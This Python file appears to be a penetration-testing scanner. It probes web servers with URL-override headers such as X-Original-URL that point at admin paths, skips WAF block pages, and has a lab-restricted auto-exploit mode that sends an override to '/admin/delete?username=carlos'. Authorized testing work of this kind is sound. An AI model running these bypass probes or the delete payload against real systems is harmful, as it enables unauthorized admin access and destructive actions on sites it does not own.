#!/usr/bin/env python3
"""
scan.py - WAF-aware X-Override scanner (single-file)

Usage examples:
  python3 scan.py -u https://example.com
  python3 scan.py -u example.com --deep --post-data "username=wiener&password=peter&csrf=XYZ" --cookie "session=abc" --insecure
  python3 scan.py -u https://target --deep --max 300 --workers 10 --json-output findings.json

Notes:
 - Use only on authorized targets (labs / your infra).
 - Requires: requests
     pip install requests
"""

import argparse
import requests
import os
import re
import sys
import hashlib
import json
import csv
import concurrent.futures as cf
from urllib.parse import urljoin, urlparse
from difflib import SequenceMatcher

# ------------- Colors & Banner -------------
RESET = "\033[0m"
RED   = "\033[91m"
GREEN = "\033[92m"
YELLOW= "\033[93m"
BLUE  = "\033[94m"
CYAN  = "\033[96m"
BOLD  = "\033[1m"

def banner():
    print(f"{BOLD}{CYAN}[+] X-Override Scanner v1.0 by Songül Kızılay{RESET}")
    print(f"{CYAN}    WAF-aware URL Override & Admin Bypass Detector{RESET}\n")

# ---------------- Config ----------------
SECLISTS_DIR_DEFAULT = "/usr/share/seclists/Discovery/Web-Content"
HEADER_VARIANTS = [
    "X-Original-URL","X-Original-Url","X-Original-URI","X-Original-Uri",
    "X-Rewrite-URL","X-Rewrite-Url","X-Override-URL",
    "X-Forwarded-Host","X-Forwarded-For","X-Forwarded-Proto",
    "X-HTTP-Method-Override","X-Requested-With"
]
ADMIN_KEYWORDS = ["admin","administrator","panel","dashboard","manage","delete","settings","login","user","users","csrf","token","adminer"]
DEFAULT_BASELINE_PATHS = ["/", "/index", "/home", "/login"]
DEFAULT_OVERRIDE_TARGETS = ["/admin","/admin/delete","/admin/delete?username=test"]

# thresholds
SIMILARITY_THRESHOLD = 0.85   # candidate similar to baseline if > this
ADMIN_KEYWORD_COUNT_THRESHOLD = 2
LEN_DIFF_MIN = 50  # minimal body length diff to consider significant

# WAF detection heuristics
WAF_TITLE_PATTERNS = [
    "request rejected", "access denied", "forbidden", "blocked", "request blocked",
    "security warning", "this request has been blocked"
]
WAF_BODY_PATTERNS = [
    "request rejected", "access denied", "blocked by", "cloudflare", "incapsula", "waf", "ddos-guard",
    "suspicious request", "malformed request"
]
WAF_MAX_LEN = 800  # typically WAF block pages small

# ---------------- Utilities ----------------
def normalize_path(p):
    if not p: return None
    p = p.strip()
    if "://" in p:
        try:
            p = urlparse(p).path or "/"
        except:
            pass
    p = p.replace("\\","/")
    p = re.sub(r"/+", "/", p)
    if not p.startswith("/"): p = "/" + p
    if p != "/" and p.endswith("/"): p = p.rstrip("/")
    return p

def extract_title(html):
    if not html:
        return ""
    m = re.search(r"<title[^>]*>(.*?)</title>", html, re.I | re.S)
    if m:
        return re.sub(r"\s+", " ", m.group(1)).strip()
    return ""

def sha256(text):
    if text is None: return ""
    return hashlib.sha256(text.encode("utf-8", errors="ignore")).hexdigest()

def similarity(a, b):
    return SequenceMatcher(None, a, b).ratio()

def looks_like_waf(title, body, status, length):
    t = (title or "").lower()
    b = (body or "").lower()
    if any(p in t for p in WAF_TITLE_PATTERNS):
        return True, "title pattern"
    if length > 0 and length <= WAF_MAX_LEN and any(p in b for p in WAF_BODY_PATTERNS):
        return True, "short body pattern"
    if status in (400, 403, 406) and length <= WAF_MAX_LEN:
        return True, "status small-body heuristic"
    if "request rejected" in b or "access denied" in b:
        return True, "explicit string"
    return False, None

# ---------------- Classes ----------------
class Requester:
    def __init__(self, verify=True, timeout=8):
        self.session = requests.Session()
        self.session.verify = verify
        self.session.headers.update({"User-Agent":"XOverrideScanner/1.0"})
        self.timeout = timeout
        self.session.trust_env = True

    def get(self, url, headers=None, allow_redirects=False):
        try:
            return self.session.get(url, headers=headers, allow_redirects=allow_redirects, timeout=self.timeout)
        except requests.RequestException:
            return None

    def post(self, url, headers=None, data=None, allow_redirects=False):
        try:
            return self.session.post(url, headers=headers, data=data, allow_redirects=allow_redirects, timeout=self.timeout)
        except requests.RequestException:
            return None

class SecListsLoader:
    def __init__(self, base_dir=None, filter_keywords=None):
        self.base_dir = base_dir or SECLISTS_DIR_DEFAULT
        self.filter_keywords = filter_keywords or ["admin","panel","dashboard","manage","login","root","secure","private","console","adminer"]
        self.paths = []

    def discover(self, max_paths=2000):
        out=[]
        if not os.path.isdir(self.base_dir):
            return out
        for root, dirs, files in os.walk(self.base_dir):
            for fname in files:
                full = os.path.join(root, fname)
                try:
                    with open(full, "r", errors="ignore") as fh:
                        for line in fh:
                            line=line.strip()
                            if not line or line.startswith("#"): continue
                            low=line.lower()
                            if not any(k in low for k in self.filter_keywords): continue
                            p = normalize_path(line)
                            if p:
                                out.append(p)
                except Exception:
                    continue
        seen=set(); clean=[]
        for p in out:
            if p not in seen:
                seen.add(p)
                clean.append(p)
            if len(clean) >= max_paths:
                break
        self.paths = clean
        return clean

class Analyzer:
    def __init__(self, baseline_map):
        self.baseline = baseline_map or {}

    def fingerprint_match(self, candidate_text):
        best=(None,0.0)
        for p,b in self.baseline.items():
            sim = similarity(candidate_text or "", b.get("text","") or "")
            if sim > best[1]:
                best=(p,sim)
        return best

    def is_admin_like(self, text):
        if not text:
            return False, 0, []
        low = (text or "").lower()
        found=[]
        for k in ADMIN_KEYWORDS:
            if k in low:
                found.append(k)
        return (len(found) >= ADMIN_KEYWORD_COUNT_THRESHOLD), len(found), found

    def analyze(self, baseline_resp, candidate_resp):
        reasons=[]
        severity="LOW"
        if candidate_resp is None:
            return {"interesting":False, "reasons":["no candidate response"], "severity":severity, "waf":False}

        c_status = candidate_resp.status_code
        c_text = candidate_resp.text or ""
        c_len = len(candidate_resp.content or b"")
        c_title = extract_title(c_text)

        # WAF detection early
        is_waf, why = looks_like_waf(c_title, c_text, c_status, c_len)
        if is_waf:
            return {"interesting":False, "reasons":[f"waf detected: {why}"], "severity":"LOW", "waf":True}

        if baseline_resp is None:
            reasons.append("no baseline - candidate responded")
            severity="MEDIUM"
        else:
            b_status = baseline_resp.status_code
            b_text = baseline_resp.text or ""
            b_len = len(baseline_resp.content or b"")
            b_title = extract_title(b_text)

            # status change
            if b_status != c_status:
                reasons.append(f"status changed {b_status} -> {c_status}")
                if b_status in (401,403,404) and c_status in (200,301,302):
                    severity="HIGH"
                else:
                    severity = "MEDIUM" if severity!="HIGH" else severity

            # title diff
            if b_title and c_title and b_title.strip().lower() != c_title.strip().lower():
                reasons.append(f"title changed: '{b_title}' -> '{c_title}'")
                severity = "MEDIUM" if severity!="HIGH" else severity

            # length diff
            if abs(b_len - c_len) > max(LEN_DIFF_MIN, b_len//10 if b_len>0 else LEN_DIFF_MIN):
                reasons.append(f"body length changed ({b_len} -> {c_len})")
                severity = "MEDIUM" if severity!="HIGH" else severity

        # fingerprint
        matched_path, sim = self.fingerprint_match(c_text)
        if matched_path and sim >= SIMILARITY_THRESHOLD:
            reasons.append(f"response similar to baseline '{matched_path}' (sim={sim:.2f})")
            if severity != "HIGH":
                severity = "LOW"

        # admin detection
        admin_like, _, found = self.is_admin_like(c_text)
        if admin_like:
            reasons.append(f"admin-like keywords found: {found}")
            if severity in ("LOW","MEDIUM"):
                severity="HIGH"

        loc = candidate_resp.headers.get("Location")
        if loc:
            reasons.append(f"Location header in candidate: {loc}")
            if severity!="HIGH":
                severity="MEDIUM"

        # signals scoring
        signals=0
        if any("status changed" in r for r in reasons): signals+=1
        if any(r.startswith("title changed") for r in reasons): signals+=1
        if admin_like: signals+=1
        if any("body length changed" in r for r in reasons): signals+=1
        if loc: signals+=1
        if not (matched_path and sim >= SIMILARITY_THRESHOLD):
            signals+=1

        if signals >= 3:
            final_sev="HIGH"
        elif signals==2:
            final_sev="MEDIUM"
        else:
            final_sev="LOW"

        if matched_path and sim >= SIMILARITY_THRESHOLD and not admin_like and final_sev!="HIGH":
            return {"interesting":False, "reasons":["response matches baseline; likely fallback"], "severity":"LOW", "waf":False}

        return {"interesting": True if final_sev!="LOW" else False, "reasons":reasons, "severity":final_sev, "waf":False}

class Scanner:
    def __init__(self, target, post_data=None, cookie=None,
                 insecure=False, deep=False, max_paths=200, timeout=8,
                 workers=4, json_output=None, csv_output=None, auto_exploit=False):
        self.raw_target = target
        if not (target.startswith("http://") or target.startswith("https://")):
            self.target_candidates = ["https://" + target, "http://" + target]
        else:
            self.target_candidates = [target.rstrip("/")]
        self.post_data = post_data
        self.cookie = cookie
        self.verify = not insecure
        self.deep = deep
        self.max_paths = max_paths
        self.req = Requester(verify=self.verify, timeout=timeout)
        self.secloader = SecListsLoader()
        self.baseline_map = {}
        self.analyzer = None
        self.findings = []
        self.seen_findings = set()
        self.override_targets = list(DEFAULT_OVERRIDE_TARGETS)
        self.headers_to_try = HEADER_VARIANTS
        self.workers = max(1, workers)
        self.json_output = json_output
        self.csv_output = csv_output
        self.auto_exploit = auto_exploit

    def build_override_list(self):
        if self.deep:
            secl = self.secloader.discover(max_paths=self.max_paths*5)
            for p in secl:
                if p not in self.override_targets:
                    self.override_targets.append(p)
        norm=[]
        for p in self.override_targets:
            n = normalize_path(p)
            if n and n not in norm:
                norm.append(n)
        self.override_targets = norm

    def prepare_baselines(self, base_url):
        print(f"{YELLOW}[*] Preparing baselines for:{RESET}", base_url)
        self.baseline_map = {}
        headers = {}
        if self.cookie: headers["Cookie"]=self.cookie
        for p in DEFAULT_BASELINE_PATHS:
            url = urljoin(base_url, p.lstrip("/"))
            r = self.req.get(url, headers=headers, allow_redirects=False)
            if r is None:
                continue
            self.baseline_map[p] = {
                "len": len(r.content or b""),
                "hash": sha256(r.text or ""),
                "title": extract_title(r.text or ""),
                "text": r.text or "",
                "status": r.status_code
            }
            print(f"  baseline {p} -> status {r.status_code} len {len(r.content or b'')}")
        self.analyzer = Analyzer({k:v for k,v in self.baseline_map.items()})

    def _worker_job(self, job, base_get, base_post, target_url, headers_base):
        method, header, override_norm, path = job
        hdrs = dict(headers_base)
        hdrs[header] = override_norm
        try:
            if method == "GET":
                r = requests.get(target_url, headers=hdrs, allow_redirects=False, timeout=self.req.timeout, verify=self.verify)
                res = self.analyzer.analyze(base_get, r)
            else:
                r = requests.post(target_url, headers=hdrs, data=self.post_data, allow_redirects=False, timeout=self.req.timeout, verify=self.verify)
                res = self.analyzer.analyze(base_post, r)
        except requests.RequestException:
            return None

        if res.get("waf") or not res.get("interesting"):
            return None

        return {
            "header": header,
            "method": method,
            "override": override_norm,
            "path": path,
            "severity": res["severity"],
            "reasons": res["reasons"],
            "candidate_len": (len(r.content) if r and r.content else 0),
            "candidate_title": extract_title(r.text if r else "")
        }

    def run_once(self, base_url):
        self.build_override_list()
        self.prepare_baselines(base_url)
        headers = {}
        if self.cookie: headers["Cookie"]=self.cookie

        test_paths = ["/", "/login"]
        for path in test_paths:
            target_url = urljoin(base_url, path.lstrip("/"))
            print(f"\n{BLUE}== Testing baseline path {path} on {base_url} =={RESET}")
            base_get = self.req.get(target_url, headers=headers, allow_redirects=False)
            base_post = None
            if self.post_data:
                base_post = self.req.post(target_url, headers=headers, data=self.post_data, allow_redirects=False)

            jobs = []
            for header in self.headers_to_try:
                for override in self.override_targets:
                    override_norm = normalize_path(override)
                    jobs.append(("GET", header, override_norm, path))
                    if self.post_data:
                        jobs.append(("POST", header, override_norm, path))

            with cf.ThreadPoolExecutor(max_workers=self.workers) as executor:
                futures = [executor.submit(self._worker_job, j, base_get, base_post, target_url, headers) for j in jobs]
                for fut in futures:
                    result = fut.result()
                    if not result:
                        continue
                    keyid = "|".join([
                        result["header"],
                        result["method"],
                        result["override"],
                        result["path"]
                    ])
                    if keyid in self.seen_findings:
                        continue
                    self.seen_findings.add(keyid)
                    self.findings.append(result)

    def run(self):
        for base in self.target_candidates:
            print(f"{BLUE}== Testing base: {base} =={RESET}")
            r = self.req.get(base, headers=None, allow_redirects=False)
            if r is None:
                print(f"  {RED}[!] Base not reachable:{RESET}", base)
                continue
            self.run_once(base)

        print(f"\n{GREEN}[+] Scan complete. Findings: {len(self.findings)}{RESET}")
        if not self.findings:
            print(f"{YELLOW}  No backend-level override behavior detected (WAF-blocks filtered).{RESET}")
        else:
            for f in self.findings:
                sev = f["severity"]
                color = GREEN if sev=="HIGH" else (YELLOW if sev=="MEDIUM" else RESET)
                print(f"{color}[{sev}] {f['header']} {f['method']} -> {f['override']} on {f['path']}{RESET}")
                for r in f["reasons"]:
                    print("   -", r)
                print(f"   candidate_len: {f.get('candidate_len')} title: {f.get('candidate_title')}")

        # export
        if self.json_output:
            try:
                with open(self.json_output, "w", encoding="utf-8") as jf:
                    json.dump(self.findings, jf, indent=2, ensure_ascii=False)
                print(f"{GREEN}[+] JSON output written to {self.json_output}{RESET}")
            except Exception as e:
                print(f"{RED}[!] Failed to write JSON: {e}{RESET}")

        if self.csv_output:
            try:
                with open(self.csv_output, "w", newline="", encoding="utf-8") as cfh:
                    fieldnames = ["header","method","override","path","severity","candidate_len","candidate_title","reasons"]
                    writer = csv.DictWriter(cfh, fieldnames=fieldnames)
                    writer.writeheader()
                    for f in self.findings:
                        writer.writerow({
                            "header": f["header"],
                            "method": f["method"],
                            "override": f["override"],
                            "path": f["path"],
                            "severity": f["severity"],
                            "candidate_len": f.get("candidate_len"),
                            "candidate_title": f.get("candidate_title"),
                            "reasons": "; ".join(f.get("reasons", [])),
                        })
                print(f"{GREEN}[+] CSV output written to {self.csv_output}{RESET}")
            except Exception as e:
                print(f"{RED}[!] Failed to write CSV: {e}{RESET}")

        # auto exploit (lab-only)
        if self.auto_exploit:
            self.run_auto_exploit()

    def run_auto_exploit(self):
        print(f"\n{CYAN}[*] Auto-exploit mode enabled (PortSwigger labs only).{RESET}")
        for base in self.target_candidates:
            host = (urlparse(base).hostname or "").lower()
            if "web-security-academy.net" not in host:
                print(f"{YELLOW}  [-] Skipping auto-exploit for {base} (not a PortSwigger lab){RESET}")
                continue
            print(f"{GREEN}  [+] Attempting lab-style exploit on {base}{RESET}")
            headers = {}
            if self.cookie:
                headers["Cookie"] = self.cookie
            headers["X-Original-URL"] = "/admin/delete?username=carlos"
            resp = self.req.get(base, headers=headers, allow_redirects=False)
            if resp is None:
                print(f"{RED}    [!] Exploit request failed{RESET}")
                continue
            print(f"    Status: {resp.status_code}, Location: {resp.headers.get('Location')}, Len: {len(resp.content or b'')}")
            print(f"{YELLOW}    Note: For PortSwigger labs, a 302/200 here genelde lab çözümü anlamına gelir.{RESET}")

# ---------------- CLI ----------------
def parse_args():
    p = argparse.ArgumentParser(description="WAF-aware X-Override scanner (single-file). Use only on authorized targets.")
    p.add_argument("-u","--url", required=True, help="Target host or base URL (example.com or https://example.com)")
    p.add_argument("--deep", action="store_true", help="Enable SecLists deep mode (optimized filter)")
    p.add_argument("--post-data", dest="post_data", help="POST body to use (enable POST tests)")
    p.add_argument("--cookie", help="Cookie header value to include")
    p.add_argument("--insecure", action="store_true", help="Disable TLS verify")
    p.add_argument("--max", type=int, default=300, help="Max SecLists paths to load (optimized)")
    p.add_argument("--timeout", type=int, default=8, help="Request timeout seconds")
    p.add_argument("--workers", type=int, default=4, help="Number of concurrent workers (default 4)")
    p.add_argument("--json-output", help="Write findings to JSON file")
    p.add_argument("--csv-output", help="Write findings to CSV file")
    p.add_argument("--auto-exploit", action="store_true", help="Attempt lab-style exploit on web-security-academy.net targets")
    return p.parse_args()

def main():
    banner()
    args = parse_args()
    scanner = Scanner(
        target=args.url,
        post_data=args.post_data,
        cookie=args.cookie,
        insecure=args.insecure,
        deep=args.deep,
        max_paths=args.max,
        timeout=args.timeout,
        workers=args.workers,
        json_output=args.json_output,
        csv_output=args.csv_output,
        auto_exploit=args.auto_exploit
    )
    if args.deep:
        if os.path.isdir(SECLISTS_DIR_DEFAULT):
            scanner.secloader.base_dir = SECLISTS_DIR_DEFAULT
        else:
            alt = "/usr/share/wordlists/seclists/Discovery/Web-Content"
            if os.path.isdir(alt):
                scanner.secloader.base_dir = alt
    scanner.run()

if __name__ == "__main__":
    main()
